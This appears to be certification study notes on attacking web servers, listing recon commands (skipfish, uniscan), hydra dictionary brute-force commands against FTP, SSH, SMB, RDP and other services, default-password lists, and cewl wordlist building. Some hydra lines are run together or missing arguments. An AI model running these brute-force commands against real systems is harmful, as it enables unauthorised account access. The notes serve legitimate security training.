# 13 - Hacking Web Servers

## Module 13 - Hacking Web Servers

<details>

<summary>EMPTY</summary>



</details>

## Web Server Reconnaissance & Footprinting

### Skipfish – WebServer Recon

`skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.12:8080`

\-o path to store output, -S read only word list

### ID Server - Webserver Foot printing

* ID Serve determines the domain name associated with an IP address.
* Click the Server Query tab. In option 1, enter the URL (http://10.10.10.12:8080/CEH)
* Click Query the Server

### Uniscan - WebServer Fingerprinting (Kali)

* Use `uniscan -h` for usage techniques
* `uniscan -u http://10.10.10.12:8080/CEH -qwed` -u url scan . -q directory check, - w file check, -e robots.txt and sitemap.xml check, -d for dynamic checks
* To view report, go to /usr/share/uniscan/report

{% embed url="https://www.kali.org/tools/uniscan/" %}

### **Bruteforce Credentials using a Dictionary Attack**

* `nmap -p 21 <Target IP>`
* `hydra -L usernames.txt -P passwords.txt ftp://10.10.10.10`
* `hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.11`
* `hydra -l root -P passwords.txt [-t 32] ftp`
* `hydra -L usernames.txt -P pass.txt mysql`
* `hydra -l USERNAME -P /path/to/passwords.txt -f pop3 -V`
* `hydra -V -f -L -P rdp:// hydra -P common-snmp-community-strings.txt target.com snmp`
* `hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1 hydra -l root -P passwords.txt ssh`

{% content-ref url="../hydra.md" %}
[hydra.md](../hydra.md)
{% endcontent-ref %}

### **Useful default password list**

* [http://www.phenoelit.org/dpl/dpl.html](http://www.phenoelit.org/dpl/dpl.html)
* [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)
* [https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium)

### **Making custom wordlist from website keywords:**

* **`cewl`**` ``example.com -m 5 -w words.txt`

where **cewl** is the tool, **example.com** is the site, **-m** is to specify the minimum length of the word , **-w** is to specify the output file

{% content-ref url="../cewl.md" %}
[cewl.md](../cewl.md)
{% endcontent-ref %}



